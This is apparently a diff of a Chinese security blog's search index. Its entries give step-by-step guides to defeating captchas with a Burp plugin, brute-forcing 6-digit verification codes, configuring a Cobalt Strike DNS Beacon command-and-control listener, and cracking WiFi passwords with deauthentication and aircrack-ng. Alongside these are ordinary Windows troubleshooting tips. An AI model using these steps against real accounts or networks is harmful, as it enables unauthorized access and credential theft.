@@ -4,6 +4,63 @@
   
   
   <entry>
+    <title>burp验证码识别插件的使用方法</title>
+    <link href="/2024/07/02/burp%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+    <url>/2024/07/02/burp%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<p>插件下载地址：<a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p><p>burp插件配合<a href="https://github.com/sml2h3/ddddocr">ddddocr</a>实现验证码识别，适配新版burpsuite。</p><h3 id="1、burp配置"><a href="#1、burp配置" class="headerlink" title="1、burp配置"></a>1、burp配置</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704508608454-ce7c17f2-3399-4696-b329-678e043ccf2c.png" alt="img"></p><h3 id="2、本地启动验证码识别脚本"><a href="#2、本地启动验证码识别脚本" class="headerlink" title="2、本地启动验证码识别脚本"></a>2、本地启动验证码识别脚本</h3><p><code>python ocr_server.py --port 9898 --ocr</code></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702101657734.png" alt="image-20240702101657734"></p><h3 id="3、插件配置"><a href="#3、插件配置" class="headerlink" title="3、插件配置"></a>3、插件配置</h3><p>右键发送验证码请求包到插件，接口url填写验证码识别接口：<a href="http://127.0.0.1:9898/">http://127.0.0.1:9898</a></p><p><strong>Requst数据包</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ocr/b64/text</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:9898<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><br><span class="language-apache"><span class="hljs-section">&lt;@BASE64&gt;</span><span class="hljs-section">&lt;@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@BASE64&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="4、在Intruder模块调用"><a href="#4、在Intruder模块调用" class="headerlink" title="4、在Intruder模块调用"></a>4、在Intruder模块调用</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704515183908-f86a9e55-8602-4059-a8fe-74fb8de7a2f0.gif" alt="img"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>burp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CS(Cobaltstrike)配置DNS Beacon</title>
+    <link href="/2024/07/02/CS(Cobaltstrike)%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
+    <url>/2024/07/02/CS(Cobaltstrike)%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
+    
+    <content type="html"><![CDATA[<h4 id="1、域名配置"><a href="#1、域名配置" class="headerlink" title="1、域名配置"></a>1、域名配置</h4><p>域名解析添加一条A记录指向VPS地址，添加NS记录指向A记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 一条A记录指向CS的IP地址</span><br>vpn.test.com =&gt; VPS IP<br><span class="hljs-comment"># 几条NS记录指向刚刚A记录对应的域名</span><br>ns1.test.com =&gt; vpn.test.com<br>ns2.test.com =&gt; vpn.test.com<br>ns3.test.com =&gt; vpn.test.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/22794324/1704508609721-28542c15-ffd1-4e6a-9ec5-ffe5637e098a.png" alt="img"></p><h4 id="2、CS-Listener-配置"><a href="#2、CS-Listener-配置" class="headerlink" title="2、CS Listener 配置"></a>2、CS Listener 配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: DNS Beacon<br>DNS Hosts: 域名的NS记录<br>DNS Hosts(Stager): NS记录<br>DNS Port(Bind): 空<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704508609795-5c847678-5117-4fd8-a7c1-6177a9ec6c02.png" alt="img"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Cobaltstrike</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>异常问题的解决方案</title>
+    <link href="/2024/07/02/%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <url>/2024/07/02/%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
+    
+    <content type="html"><![CDATA[<h3 id="1、Windows桌面文件不能拖动"><a href="#1、Windows桌面文件不能拖动" class="headerlink" title="1、Windows桌面文件不能拖动"></a>1、Windows桌面文件不能拖动</h3><p><strong>解决方案：</strong></p><blockquote><p>长按键盘左上角Esc键几秒后松开即可</p></blockquote><h3 id="2、Windows系统，“桌面”变“Desktop”"><a href="#2、Windows系统，“桌面”变“Desktop”" class="headerlink" title="2、Windows系统，“桌面”变“Desktop”"></a>2、Windows系统，“桌面”变“Desktop”</h3><p><strong>解决方案：</strong></p><blockquote><p>检查桌面目录下的<code>desktop.ini</code>文件，写入下面的内容，然后重启桌面。<code>desktop.ini</code>文件不存在，就新建一个。</p></blockquote><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">[.ShellClassInfo]<br>LocalizedResourceName=@<span class="hljs-comment">%SystemRoot%\system32\shell32.dll,-21769</span><br>IconResource=<span class="hljs-comment">%SystemRoot%\system32\imageres.dll,-183</span><br></code></pre></td></tr></table></figure><h3 id="3、如何保存Win10锁屏界面的壁纸"><a href="#3、如何保存Win10锁屏界面的壁纸" class="headerlink" title="3、如何保存Win10锁屏界面的壁纸"></a>3、如何保存Win10锁屏界面的壁纸</h3><p><strong>解决方案：</strong></p><blockquote><p>聚焦壁纸的路径：<code>%localappdata%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</code></p><p>文件复制出来，修改后缀名<code>.jpg</code>。</p></blockquote><h3 id="4、Windows桌面文件删除后需要刷新一下才消失"><a href="#4、Windows桌面文件删除后需要刷新一下才消失" class="headerlink" title="4、Windows桌面文件删除后需要刷新一下才消失"></a>4、Windows桌面文件删除后需要刷新一下才消失</h3><p><strong>解决方案：</strong></p><blockquote><p>重启一下资源管理器<code>explorer.exe</code>就好了</p></blockquote><h3 id="5、Windows调整桌面-右键菜单-新建选项-的顺序"><a href="#5、Windows调整桌面-右键菜单-新建选项-的顺序" class="headerlink" title="5、Windows调整桌面 右键菜单 新建选项 的顺序"></a>5、Windows调整桌面 右键菜单 新建选项 的顺序</h3><p><strong>解决方案：</strong></p><blockquote><p>注册表位置：<code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code></p><p>修改Classes键值，排列成你想要的顺序</p></blockquote><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858747861-d133d7f7-bf75-48e2-a49f-177a36022aef.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858706450-88ba7023-51e2-44c3-bf65-fd91ee9f71ac.png" alt="img"></p><h3 id="6、Windows-桌面图标间距异常"><a href="#6、Windows-桌面图标间距异常" class="headerlink" title="6、Windows 桌面图标间距异常"></a>6、Windows 桌面图标间距异常</h3><p><strong>解决方案：</strong></p><blockquote><p>注册表位置：<code>计算机\HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics</code></p><p>修改 <code>IconSpacing</code> 和 <code>IconVerticalSpacing</code> 这两个键值，默认值均为 -1125。</p><p><strong>IconSpacing</strong> 为「图标之间的水平间距」</p><p><strong>IconVerticalSpacing</strong> 为「图标之间的垂直间距」</p></blockquote><h3 id="7、浏览器访问异常：您目前无法访问-因为此网站使用了-HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。"><a href="#7、浏览器访问异常：您目前无法访问-因为此网站使用了-HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。" class="headerlink" title="7、浏览器访问异常：您目前无法访问 因为此网站使用了 HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。"></a>7、浏览器访问异常：您目前无法访问 因为此网站使用了 HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。</h3><p><strong>解决方案：</strong></p><blockquote><p>浏览器页面，键盘直接敲下：thisisunsafe</p></blockquote>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>异常问题</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>xray反连平台配置</title>
     <link href="/2023/07/19/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E9%85%8D%E7%BD%AE/"/>
     <url>/2023/07/19/xray%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0%E9%85%8D%E7%BD%AE/</url>
@@ -20,7 +77,7 @@
     
     <tags>
       
-      <tag>工具</tag>
+      <tag>xray</tag>
       
     </tags>
     
@@ -70,7 +127,7 @@
     
     <tags>
       
-      <tag>nuclei</tag>
+      <tag>扫描工具</tag>
       
     </tags>
     
@@ -95,7 +152,7 @@
     
     <tags>
       
-      <tag>工具</tag>
+      <tag>扫描工具</tag>
       
     </tags>
     
@@ -245,7 +302,7 @@
     
     <tags>
       
-      <tag>nmap</tag>
+      <tag>扫描工具</tag>
       
     </tags>
     
@@ -395,7 +452,7 @@
     
     <tags>
       
-      <tag>设置</tag>
+      <tag>远程桌面</tag>
       
     </tags>
     
@@ -454,9 +511,9 @@
   
   
   <entry>
-    <title>burpsuite随机爆破6位验证码</title>
-    <link href="/2020/04/30/burpsuite%E9%9A%8F%E6%9C%BA%E7%88%86%E7%A0%B46%E4%BD%8D%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
-    <url>/2020/04/30/burpsuite%E9%9A%8F%E6%9C%BA%E7%88%86%E7%A0%B46%E4%BD%8D%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
+    <title>burp随机爆破6位验证码</title>
+    <link href="/2020/04/30/burp%E9%9A%8F%E6%9C%BA%E7%88%86%E7%A0%B46%E4%BD%8D%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
+    <url>/2020/04/30/burp%E9%9A%8F%E6%9C%BA%E7%88%86%E7%A0%B46%E4%BD%8D%E9%AA%8C%E8%AF%81%E7%A0%81/</url>
     
     <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>遇到6位数验证码的时候，如果把字典全跑一遍的话，耗时就太多了。使用burp可以进行随机性的枚举。</p><h4 id="1、过程"><a href="#1、过程" class="headerlink" title="1、过程"></a>1、过程</h4><p>设置 Intruder模块 ——&gt; Payload Sets 为 Numbers</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E5%9B%BE%E7%89%8720200430145122.png" alt="img"></p><p>设置 Payload Options [Numbers] 为 Random</p><p>How many : 爆破次数</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200430145421-1024x742.jpg" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20200430151410.jpg" alt="img"></p>]]></content>
     
@@ -586,16 +643,10 @@
     <content type="html"><![CDATA[<h4 id="1、设置无线网卡"><a href="#1、设置无线网卡" class="headerlink" title="1、设置无线网卡"></a>1、设置无线网卡</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网卡信息</span><br>iwconfig<br><span class="hljs-comment"># 结束可能会影响网卡监听的进程</span><br>airmon-ng check <span class="hljs-built_in">kill</span><br><span class="hljs-comment"># 网卡设置为监听模式，完成后wlan0会变成wlan0mon</span><br>airmon-ng start wlan0<br><span class="hljs-comment"># 探测附件WiFi信息</span><br>airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png" alt="img"></p><h4 id="2、抓取数据包"><a href="#2、抓取数据包" class="headerlink" title="2、抓取数据包"></a>2、抓取数据包</h4><p>抓取连接成功的数据包，用来解密wifi密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># airodump-ng wlan0mon -c 信道 --bssid 目标 -w 保存结果</span><br>airodump-ng wlan0mon -c 8 --bssid D4:**:**:**:**:E0 -w <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg" alt="img"></p><h4 id="3、WiFi攻击"><a href="#3、WiFi攻击" class="headerlink" title="3、WiFi攻击"></a>3、WiFi攻击</h4><p>伪造数据包，模拟请求断开wifi连接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数:</span><br>-0 <span class="hljs-comment"># 指定次数， 0 则一直攻击</span><br>-a <span class="hljs-comment"># 指定WiFi-BSSID </span><br>-c <span class="hljs-comment"># 指定已连接WiFi的目标设备STATION，也可以不指定目标，攻击全部已经连接的设备</span><br><br>aireplay-ng -0 10 -a D4:**:**:**:**:E0 wlan0mon -c 30:**:**:**:**:23  <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png" alt="img"></p><h4 id="4、爆破WiFi密码"><a href="#4、爆破WiFi密码" class="headerlink" title="4、爆破WiFi密码"></a>4、爆破WiFi密码</h4><p>抓取到数据包后，使用字典枚举wifi密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数:</span><br>-w  <span class="hljs-comment"># 字典的路径</span><br>test-01.cap <span class="hljs-comment"># 抓取的数据包</span><br><br>aircrack-ng -w password.txt test-01.cap <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png" alt="img"></p>]]></content>
     
     
-    <categories>
-      
-      <category>无线安全</category>
-      
-    </categories>
-    
     
     <tags>
       
-      <tag>wifi</tag>
+      <tag>无线安全</tag>
       
     </tags>
     
